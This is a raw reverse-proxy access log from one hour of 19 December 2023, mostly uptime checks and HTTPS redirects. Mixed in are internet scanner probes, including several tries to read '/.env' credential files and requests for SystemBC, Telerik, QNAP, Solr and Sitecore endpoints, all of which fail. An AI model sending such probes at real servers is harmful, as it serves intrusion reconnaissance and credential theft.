64.62.197.60 - - [19/Dec/2023:10:57:42 +0000] "GET /dns-query?name=dnsscan.shadowserver.org&type=A HTTP/1.1" 404 19 "-" "-" 9227 "-" "-" 0ms
64.62.197.53 - - [19/Dec/2023:10:57:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9228 "-" "-" 0ms
64.62.197.50 - - [19/Dec/2023:10:58:01 +0000] "GET /api/v2/static/not.found HTTP/1.1" 404 19 "-" "-" 9229 "-" "-" 0ms
64.62.197.59 - - [19/Dec/2023:10:58:06 +0000] "GET /remote/logincheck HTTP/1.1" 404 19 "-" "-" 9230 "-" "-" 0ms
64.62.197.56 - - [19/Dec/2023:10:58:20 +0000] "GET /geoserver/web/ HTTP/1.1" 404 19 "-" "-" 9231 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:10:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9232 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9233 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:10:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9234 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:10:59:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9235 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:00:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9236 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:00:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9237 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:01:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9238 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:01:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9239 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:02:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9240 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:02:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9241 "www@docker" "http://172.18.0.9:80" 0ms
143.110.222.166 - - [19/Dec/2023:11:02:48 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9242 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:03:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9243 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:03:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9244 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:04:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9245 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:04:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9246 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:05:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9247 "www@docker" "http://172.18.0.9:80" 1ms
143.110.222.166 - - [19/Dec/2023:11:05:28 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9248 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:05:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9249 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:06:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9250 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:06:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9251 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:07:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9252 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:07:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9253 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:08:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9254 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:08:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9255 "www@docker" "http://172.18.0.9:80" 0ms
54.37.79.75 - - [19/Dec/2023:11:08:39 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9256 "web-to-websecure@internal" "-" 0ms
54.37.79.75 - - [19/Dec/2023:11:08:39 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9257 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:09:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9258 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:09:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9259 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:10:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9260 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:10:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9261 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:11:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9262 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:11:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9263 "www@docker" "http://172.18.0.9:80" 1ms
71.33.219.190 - - [19/Dec/2023:11:11:59 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9264 "web-to-websecure@internal" "-" 0ms
2.56.247.167 - - [19/Dec/2023:11:12:15 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9265 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:12:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9266 "www@docker" "http://172.18.0.9:80" 0ms
107.170.243.29 - - [19/Dec/2023:11:12:32 +0000] "GET /ReportServer HTTP/1.1" 301 17 "-" "-" 9267 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:12:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9268 "www@docker" "http://172.18.0.9:80" 0ms
162.243.150.39 - - [19/Dec/2023:11:13:05 +0000] "GET /ReportServer HTTP/1.1" 301 17 "-" "-" 9269 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:13:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9270 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:13:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9271 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:14:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9272 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:14:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9273 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:15:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9274 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:15:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9275 "www@docker" "http://172.18.0.9:80" 0ms
45.56.108.128 - - [19/Dec/2023:11:16:13 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 9276 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:16:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9277 "www@docker" "http://172.18.0.9:80" 0ms
107.170.230.31 - - [19/Dec/2023:11:16:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9278 "-" "-" 0ms
107.170.208.19 - - [19/Dec/2023:11:16:29 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9279 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:16:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9280 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:17:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9281 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:17:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9282 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:18:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9283 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:18:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9284 "www@docker" "http://172.18.0.9:80" 1ms
45.56.108.128 - - [19/Dec/2023:11:19:17 +0000] "GET /systembc/password.php HTTP/1.0" 404 19 "-" "-" 9285 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:19:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9286 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:19:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9287 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [19/Dec/2023:11:19:51 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9288 "web-to-websecure@internal" "-" 0ms
95.214.235.169 - - [19/Dec/2023:11:19:55 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9289 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:20:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9290 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:20:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9291 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:21:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9292 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:21:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9293 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:22:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9294 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:22:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9295 "www@docker" "http://172.18.0.9:80" 1ms
90.151.171.106 - - [19/Dec/2023:11:22:48 +0000] "CONNECT - HTTP/1.1" 308 18 "-" "-" 9296 "web-to-websecure@internal" "-" 0ms
90.151.171.106 - - [19/Dec/2023:11:22:59 +0000] "GET /ip?Z78354937572Q1 HTTP/1.1" 301 17 "-" "-" 9297 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:23:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9298 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.201 - - [19/Dec/2023:11:23:29 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9299 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:23:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9300 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:24:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9301 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:24:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9302 "www@docker" "http://172.18.0.9:80" 1ms
64.62.197.202 - - [19/Dec/2023:11:24:43 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9303 "web-to-websecure@internal" "-" 0ms
64.62.197.208 - - [19/Dec/2023:11:24:44 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9304 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:25:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9305 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.200 - - [19/Dec/2023:11:25:22 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 9306 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:25:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9307 "www@docker" "http://172.18.0.9:80" 0ms
64.62.197.204 - - [19/Dec/2023:11:25:48 +0000] "GET /geoserver/web/ HTTP/1.1" 301 17 "-" "-" 9308 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:26:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9309 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:26:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9310 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:27:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9311 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:27:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9312 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:28:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9313 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:28:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9314 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:29:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9315 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:29:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9316 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:30:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9317 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:30:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9318 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:31:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9319 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:31:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9320 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:32:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9321 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:32:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9322 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:33:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9323 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:33:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9324 "www@docker" "http://172.18.0.9:80" 1ms
107.151.182.62 - - [19/Dec/2023:11:34:09 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9325 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:09 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9326 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:34:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9327 "www@docker" "http://172.18.0.9:80" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:21 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 301 17 "-" "-" 9328 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:22 +0000] "GET /cf_scripts/scripts/ajax/ckeditor/ckeditor.js HTTP/1.1" 404 19 "-" "-" 9329 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:34 +0000] "GET /sugar_version.json HTTP/1.1" 301 17 "-" "-" 9330 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:34 +0000] "GET /sugar_version.json HTTP/1.1" 404 19 "-" "-" 9331 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:34:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9332 "www@docker" "http://172.18.0.9:80" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:47 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9333 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:47 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9334 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:48 +0000] "GET /showLogin.cc HTTP/1.1" 301 17 "-" "-" 9335 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:34:48 +0000] "GET /showLogin.cc HTTP/1.1" 404 19 "-" "-" 9336 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:01 +0000] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 301 17 "-" "-" 9337 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:01 +0000] "GET /sitecore/shell/sitecore.version.xml HTTP/1.1" 404 19 "-" "-" 9338 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:12 +0000] "GET /solr/ HTTP/1.1" 301 17 "-" "-" 9339 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:13 +0000] "GET /solr/ HTTP/1.1" 404 19 "-" "-" 9340 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:35:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9341 "www@docker" "http://172.18.0.9:80" 1ms
107.151.182.62 - - [19/Dec/2023:11:35:25 +0000] "GET /index.jsp HTTP/1.1" 301 17 "-" "-" 9342 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:26 +0000] "GET /index.jsp HTTP/1.1" 404 19 "-" "-" 9343 "-" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:35:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9344 "www@docker" "http://172.18.0.9:80" 1ms
107.151.182.62 - - [19/Dec/2023:11:35:37 +0000] "GET /favicon-32x32.png HTTP/1.1" 301 17 "-" "-" 9345 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:37 +0000] "GET /favicon-32x32.png HTTP/1.1" 404 19 "-" "-" 9346 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:37 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 9347 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:38 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 9348 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:49 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 301 17 "-" "-" 9349 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:35:49 +0000] "GET /cgi-bin/authLogin.cgi HTTP/1.1" 404 19 "-" "-" 9350 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:01 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9351 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:02 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9352 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:02 +0000] "GET / HTTP/1.1" 404 19 "-" "-" 9353 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:02 +0000] "GET /admin/ HTTP/1.1" 301 17 "-" "-" 9354 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:02 +0000] "GET /favicon.ico HTTP/1.1" 301 17 "-" "-" 9355 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:03 +0000] "GET /favicon.ico HTTP/1.1" 404 19 "-" "-" 9356 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:03 +0000] "GET /api/session/properties HTTP/1.1" 301 17 "-" "-" 9357 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:03 +0000] "GET /api/session/properties HTTP/1.1" 404 19 "-" "-" 9358 "-" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:12 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 301 17 "-" "-" 9359 "web-to-websecure@internal" "-" 0ms
107.151.182.62 - - [19/Dec/2023:11:36:12 +0000] "GET /Telerik.Web.UI.WebResource.axd?type=rau HTTP/1.1" 404 19 "-" "-" 9360 "-" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:36:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9361 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [19/Dec/2023:11:36:34 +0000] "GET /.env HTTP/1.1" 301 17 "-" "-" 9362 "web-to-websecure@internal" "-" 0ms
167.71.120.76 - - [19/Dec/2023:11:36:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9363 "www@docker" "http://172.18.0.9:80" 1ms
95.214.235.169 - - [19/Dec/2023:11:36:36 +0000] "POST / HTTP/1.1" 308 18 "-" "-" 9364 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:37:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9365 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:37:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9366 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:38:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9367 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:38:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9368 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:39:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9369 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:39:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9370 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:40:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9371 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:40:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9372 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:41:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9373 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:41:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9374 "www@docker" "http://172.18.0.9:80" 0ms
34.67.136.168 - - [19/Dec/2023:11:42:19 +0000] "GET / HTTP/1.1" 301 17 "-" "-" 9375 "web-to-websecure@internal" "-" 0ms
159.203.109.206 - - [19/Dec/2023:11:42:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9376 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:42:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9377 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:43:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9378 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:43:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9379 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:44:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9380 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:44:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9381 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:45:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9382 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:45:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9383 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:46:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9384 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:46:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9385 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:47:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9386 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:47:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9387 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:48:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9388 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:48:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9389 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:49:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9390 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:49:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9391 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:50:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9392 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:50:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9393 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:51:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9394 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:51:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9395 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:52:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9396 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:52:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9397 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:53:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9398 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:53:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9399 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:54:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9400 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:54:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9401 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:55:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9402 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:55:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9403 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:56:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9404 "www@docker" "http://172.18.0.9:80" 1ms
167.71.120.76 - - [19/Dec/2023:11:56:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9405 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:57:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9406 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:57:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9407 "www@docker" "http://172.18.0.9:80" 0ms
159.203.109.206 - - [19/Dec/2023:11:58:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9408 "www@docker" "http://172.18.0.9:80" 0ms
167.71.120.76 - - [19/Dec/2023:11:58:35 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9409 "www@docker" "http://172.18.0.9:80" 1ms
159.203.109.206 - - [19/Dec/2023:11:59:21 +0000] "GET / HTTP/2.0" 200 334 "-" "-" 9410 "www@docker" "http://172.18.0.9:80" 0ms
